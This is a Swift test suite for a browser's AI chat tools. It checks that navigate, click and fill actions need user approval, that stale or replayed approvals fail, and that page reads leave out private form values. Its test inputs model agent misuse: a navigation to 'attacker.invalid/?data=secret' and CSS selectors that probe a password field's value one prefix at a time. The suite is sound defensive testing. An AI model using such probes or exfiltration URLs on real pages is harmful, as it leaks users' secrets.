import AppKit
import AI
import BrowseCore
import Testing
import WebKit
@testable import Browse

@MainActor private final class SecurityFixture {
    let root = FileManager.default.temporaryDirectory.appendingPathComponent("AISecurity-\(UUID())")
    let store: BrowserStore
    let page = Page(address: "https://example.com/")
    let tab: BrowserTab
    let controller: PageController
    init() {
        _ = NSApplication.shared
        store = BrowserStore(sessionFile: root.appendingPathComponent("session.json"), persistentExtensions: false)
        tab = BrowserTab(title: "Security", pages: [page])
        store.session.workspaces = [Workspace(name: "Tabs", tabs: [tab])]
        store.session.selectedTab = tab.id
        controller = store.controller(for: page)
        controller.webView.frame = NSRect(x: 0, y: 0, width: 600, height: 400)
    }
    func load(_ html: String) async throws {
        controller.webView.loadHTMLString(html, baseURL: URL(string: page.address))
        for _ in 0..<200 {
            if controller.webView.url != nil && !controller.webView.isLoading { break }
            try await Task.sleep(for: .milliseconds(20))
        }
        #expect(!controller.webView.isLoading)
    }
    func clean() {
        store.stopWindow()
        try? FileManager.default.removeItem(at: root)
    }
}

// @lat: [[lat.md/tests/ai-tests#Action approval boundaries]]
@Test @MainActor func aiActionApprovalBoundaries() async throws {
    let fixture = SecurityFixture(); defer { fixture.clean() }
    try await fixture.load("<body><input id='field'><input id='secret' type='password' value='hidden-secret'><button id='send' onclick='this.textContent=\"Submitted\"'>Send</button></body>")
    var allow = false
    var proposals: [AIActionApproval.Request] = []
    var duringApproval: (() async throws -> Void)?
    let domain = "AISecurity-\(UUID())"
    let defaults = UserDefaults(suiteName: domain)!
    defer { defaults.removePersistentDomain(forName: domain) }
    let settings = AISettings(defaults: defaults)
    let tools = PaneChatTools(store: fixture.store, tabID: fixture.tab.id, settings: settings, approve: { details in
        proposals.append(details)
        try? await duringApproval?()
        return allow
    })
    let id = fixture.page.id.uuidString
    _ = try await tools.execute("read_pane", input: .init(pane: id))
    // Attribute probes must fail identically before they query the DOM, rather
    // than exposing secret form values one prefix at a time through tool errors.
    var probeErrors: [String] = []
    for selector in ["#secret[value^='h']", "#secret[value^='x']", "body"] {
        do {
            _ = try await tools.execute("fill_element", input: .init(pane: id, selector: selector, text: "probe"))
            Issue.record("Unobserved selector was accepted")
        } catch { probeErrors.append(error.localizedDescription) }
    }
    #expect(Set(probeErrors).count == 1 && proposals.isEmpty)
    for (name, input) in [
        ("navigate_pane", PaneChatTools.Input(pane: id, url: "https://attacker.invalid/?data=secret")),
        ("click_element", .init(pane: id, selector: "#send")),
        ("fill_element", .init(pane: id, selector: "#field", text: "secret"))
    ] {
        await #expect(throws: Error.self) { try await tools.execute(name, input: input) }
    }
    #expect(proposals.count == 3)
    #expect(proposals[0].destination?.contains("attacker.invalid") == true && proposals[2].text == "secret")
    #expect(fixture.controller.webView.url?.host == "example.com")
    #expect(try await fixture.controller.webView.evaluateJavaScript("document.querySelector('#field').value") as? String == "")
    #expect(try await fixture.controller.webView.evaluateJavaScript("document.querySelector('#send').textContent") as? String == "Send")
    allow = true
    _ = try await tools.execute("fill_element", input: .init(pane: id, selector: "#field", text: "approved"))
    #expect(try await fixture.controller.webView.evaluateJavaScript("document.querySelector('#field').value") as? String == "approved")
    duringApproval = { _ = try await fixture.controller.webView.evaluateJavaScript("document.querySelector('#send').outerHTML='<button id=send>Replaced</button>'") }
    await #expect(throws: Error.self) { try await tools.execute("click_element", input: .init(pane: id, selector: "#send")) }
    duringApproval = { settings.setToolEnabled("fill_element", enabled: false) }
    await #expect(throws: Error.self) { try await tools.execute("fill_element", input: .init(pane: id, selector: "#field", text: "denied")) }
    settings.setToolEnabled("fill_element", enabled: true)
    duringApproval = { fixture.controller.webView(fixture.controller.webView, didStartProvisionalNavigation: nil) }
    await #expect(throws: Error.self) { try await tools.execute("fill_element", input: .init(pane: id, selector: "#field", text: "stale")) }
    duringApproval = nil
    // Tools without a chat approval handler cannot silently allow actions.
    let unattended = PaneChatTools(store: fixture.store, tabID: fixture.tab.id, settings: settings)
    await #expect(throws: Error.self) { try await unattended.execute("click_element", input: .init(pane: id, selector: "#field")) }
    duringApproval = { fixture.store.session.workspaces[0].tabs[0].pages = [Page()] }
    await #expect(throws: Error.self) { try await tools.execute("navigate_pane", input: .init(pane: id, url: "https://attacker.invalid")) }
}

// @lat: [[lat.md/tests/ai-tests#Inline action confirmation]]
@Test @MainActor func aiInlineActionConfirmation() async throws {
    let fixture = SecurityFixture(); defer { fixture.clean() }
    try await fixture.load("<body><input id='field'></body>")
    let approval = AIActionApproval()
    let tools = PaneChatTools(store: fixture.store, tabID: fixture.tab.id, approve: approval.request)
    let pane = fixture.page.id.uuidString
    _ = try await tools.execute("read_pane", input: .init(pane: pane))
    func fill() async throws -> JSONValue {
        try await tools.execute("fill_element", input: .init(pane: pane, selector: "#field", text: "approved"), callID: "fill")
    }
    func pending() async throws -> AIActionApproval.Request {
        for _ in 0..<200 where approval.pending == nil { try await Task.sleep(for: .milliseconds(10)) }
        return try #require(approval.pending)
    }
    let accepted = Task { try await fill() }
    let first = try await pending()
    #expect(first.callID == "fill" && first.action.buttonTitle == "Fill field" && first.text == "approved")
    #expect(try await fixture.controller.webView.evaluateJavaScript("document.querySelector('#field').value") as? String == "")
    approval.resolve(UUID(), approved: true)
    #expect(approval.pending?.id == first.id)
    approval.resolve(first.id, approved: true)
    _ = try await accepted.value
    #expect(approval.pending == nil)
    #expect(try await fixture.controller.webView.evaluateJavaScript("document.querySelector('#field').value") as? String == "approved")
    approval.resolve(first.id, approved: true) // A double click cannot replay the action.
    _ = try await fixture.controller.webView.evaluateJavaScript("document.querySelector('#field').value='unchanged'")
    let denied = Task { try await fill() }
    let second = try await pending()
    approval.resolve(first.id, approved: true) // A stale button cannot approve a new request.
    #expect(approval.pending?.id == second.id)
    approval.resolve(second.id, approved: false)
    await #expect(throws: Error.self) { try await denied.value }
    let cancelled = Task { try await fill() }
    let third = try await pending()
    cancelled.cancel()
    await #expect(throws: Error.self) { try await cancelled.value }
    #expect(approval.pending == nil)
    approval.resolve(third.id, approved: true)
    #expect(try await fixture.controller.webView.evaluateJavaScript("document.querySelector('#field').value") as? String == "unchanged")
}

private struct ApprovalChatProvider: Provider {
    let pane: UUID
    func stream(_ request: ModelRequest) -> AI.Stream<ModelResponse> {
        AI.Stream { emit in
            let call: ToolCall
            switch request.messages.last?.toolResults.first?.name {
            case "read_pane":
                call = ToolCall(id: "fill", name: "fill_element", arguments: try JSONValue.object([
                    "pane": .string(pane.uuidString), "selector": .string("#field"), "text": .string("approved")
                ]).jsonString())
            case "fill_element":
                emit(.textDelta("Done"))
                return ModelResponse(message: .assistant("Done"))
            default:
                call = ToolCall(id: "read", name: "read_pane", arguments: try JSONValue.object(["pane": .string(pane.uuidString)]).jsonString())
            }
            emit(.toolCall(call))
            return ModelResponse(message: .assistant("", toolCalls: [call]), finishReason: "tool_calls")
        }
    }
}

// @lat: [[lat.md/tests/ai-tests#Chat approval lifecycle]]
@Test @MainActor func aiChatApprovalLifecycle() async throws {
    let fixture = SecurityFixture(); defer { fixture.clean() }
    try await fixture.load("<body><input id='field'></body>")
    let domain = "ChatApproval-\(UUID())"
    let defaults = UserDefaults(suiteName: domain)!
    defer { defaults.removePersistentDomain(forName: domain) }
    let settings = AISettings(defaults: defaults)
    let chat = TabChat(store: fixture.store, tabID: fixture.tab.id, settings: settings)
    fixture.store.chats[fixture.tab.id] = chat
    fixture.store.openChats.insert(fixture.tab.id)
    func send() async throws -> AIActionApproval.Request {
        chat.input = "Fill the field"
        chat.send(model: Model("test", provider: ApprovalChatProvider(pane: fixture.page.id)))
        for _ in 0..<200 where chat.actionApproval.pending == nil { try await Task.sleep(for: .milliseconds(10)) }
        return try #require(chat.actionApproval.pending)
    }
    let request = try await send()
    #expect(chat.running && chat.bubbles.filter { $0.toolID == "fill" }.count == 1)
    #expect(chat.bubbles.first(where: { $0.id == chat.approvalBubbleID })?.toolID == "fill")
    fixture.store.openChats.remove(fixture.tab.id)
    chat.approveAction(request.id)
    #expect(chat.actionApproval.pending?.id == request.id)
    fixture.store.openChats.insert(fixture.tab.id)
    chat.approveAction(request.id)
    for _ in 0..<200 where chat.running { try await Task.sleep(for: .milliseconds(10)) }
    #expect(!chat.running && chat.bubbles.last?.text == "Done")
    #expect(try await fixture.controller.webView.evaluateJavaScript("document.querySelector('#field').value") as? String == "approved")
    _ = try await fixture.controller.webView.evaluateJavaScript("document.querySelector('#field').value='unchanged'")
    let stopped = try await send()
    chat.persist()
    let saved = try #require(fixture.store.chatHistory.records.first { $0.id == chat.conversationID })
    let restored = TabChat(store: fixture.store, tabID: fixture.tab.id, settings: settings)
    restored.restore(saved)
    #expect(restored.actionApproval.pending == nil && !restored.running)
    restored.approveAction(stopped.id)
    chat.stop()
    chat.approveAction(stopped.id)
    for _ in 0..<200 where chat.running { try await Task.sleep(for: .milliseconds(10)) }
    #expect(chat.actionApproval.pending == nil && !chat.running)
    #expect(try await fixture.controller.webView.evaluateJavaScript("document.querySelector('#field').value") as? String == "unchanged")
}

// @lat: [[lat.md/tests/ai-tests#Page read field privacy]]
@Test @MainActor func aiPageReadFieldPrivacy() async throws {
    let fixture = SecurityFixture(); defer { fixture.clean() }
    try await fixture.load("""
    <body><h1>Public article</h1><section id='container'>Public context
    <textarea id='draft'>private-draft</textarea>
    <div contenteditable='true' id='editor'><b>private-editor</b></div>
    <input id='password' type='password' value='private-password'>
    <select id='account'><option>private-option</option></select></section></body>
    """)
    let tools = PaneChatTools(store: fixture.store, tabID: fixture.tab.id)
    let result = try await tools.execute("read_pane", input: .init(pane: fixture.page.id.uuidString))
    let json = try result.jsonString()
    #expect(json.contains("Public article") && json.contains("Public context"))
    #expect(!json.contains("private-"))
    // Reading must leave the real page untouched, including editor contents.
    #expect(try await fixture.controller.webView.evaluateJavaScript("document.querySelector('#draft').value") as? String == "private-draft")
    #expect(try await fixture.controller.webView.evaluateJavaScript("document.querySelector('#editor').textContent") as? String == "private-editor")
}

// @lat: [[lat.md/tests/ai-tests#Untrusted read cursor presentation]]
@Test @MainActor func aiUntrustedReadCursorPresentation() throws {
    let fixture = SecurityFixture(); defer { fixture.clean() }
    let chat = TabChat(store: fixture.store, tabID: fixture.tab.id)
    for suffix in [String(Int.max), String(Int.min), "-1", "999999999999999999999999", "invalid"] {
        let cursor = UUID().uuidString + ":" + suffix
        let arguments = try JSONValue.object(["cursor": .string(cursor)]).jsonString()
        chat.consume(.toolCall(ToolCall(id: UUID().uuidString, name: "read_pane", arguments: arguments)))
        #expect(chat.bubbles.last?.argumentSummary == "part 1")
        #expect(chat.argumentFields(arguments).first?.value == "Next part")
    }
    #expect(TabChat.readPart(UUID().uuidString + ":0") == 1)
}
